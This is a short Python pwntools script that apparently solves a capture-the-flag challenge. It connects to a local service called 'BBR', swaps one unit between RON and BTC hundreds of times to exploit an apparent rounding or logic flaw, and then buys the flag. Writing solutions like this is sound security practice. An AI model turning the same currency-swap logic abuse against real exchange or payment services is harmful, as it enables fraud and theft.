from pwn import *

def swap_ron_btc(p, amount):
    p.sendlineafter(b'Enter your choice > ', b'3')
    p.sendlineafter(b'to swap: ', str(amount).encode())

def swap_btc_ron(p, amount):
    p.sendlineafter(b'Enter your choice > ', b'4')
    p.sendlineafter(b'to swap: ', str(amount).encode())

def buy_flag(p):
    p.sendlineafter(b'Enter your choice > ', b'1337')

if __name__ == "__main__":

    # p = process("./BBR")
    p = remote("127.0.0.1", 60000)

    for i in range(250):
        swap_ron_btc(p, 1)
        print("1, ", i)

    for i in range(251):
        swap_btc_ron(p, 1)
        swap_ron_btc(p, 1)
        swap_ron_btc(p, 1)
        print("2, ", i)

    buy_flag(p)

    p.interactive()